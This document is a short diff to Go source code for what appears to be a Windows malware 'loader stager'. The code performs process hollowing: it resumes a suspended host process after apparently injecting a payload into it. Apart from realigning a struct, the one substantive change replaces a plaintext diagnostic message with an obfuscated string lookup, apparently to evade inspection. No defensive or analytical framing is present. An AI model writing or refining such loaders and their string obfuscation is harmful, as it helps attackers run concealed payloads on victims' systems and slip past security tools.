@@ -27,16 +27,16 @@ const (
 )
 
 type moduleEntry32W struct {
-	Size          uint32
-	ModuleID      uint32
-	ProcessID     uint32
-	GlblcntUsage  uint32
-	ProccntUsage  uint32
-	ModBaseAddr   uintptr
-	ModBaseSize   uint32
-	ModuleHandle  uintptr
-	Module        [256]uint16
-	ExePath       [260]uint16
+	Size         uint32
+	ModuleID     uint32
+	ProcessID    uint32
+	GlblcntUsage uint32
+	ProccntUsage uint32
+	ModBaseAddr  uintptr
+	ModBaseSize  uint32
+	ModuleHandle uintptr
+	Module       [256]uint16
+	ExePath      [260]uint16
 }
 
 func payloadImageSize(payload []byte) uint32 {
@@ -287,7 +287,7 @@ func hollowSuspended(pi *processInformation, payload []byte) error {
 	if rr, _, e := procResumeThreadH.Call(pi.ThreadHandle); rr == 0xFFFFFFFF {
 		return fmt.Errorf("ResumeThread: %v", e)
 	}
-	fmt.Fprintf(os.Stderr, "loader stager: hollow OK host=%s pid=%d entry=0x%x\n", hostProc(), pi.ProcessID, entry)
+	fmt.Fprintf(os.Stderr, xob(eDiagHollowOK), hostProc(), pi.ProcessID, entry)
 	return nil
 }
 
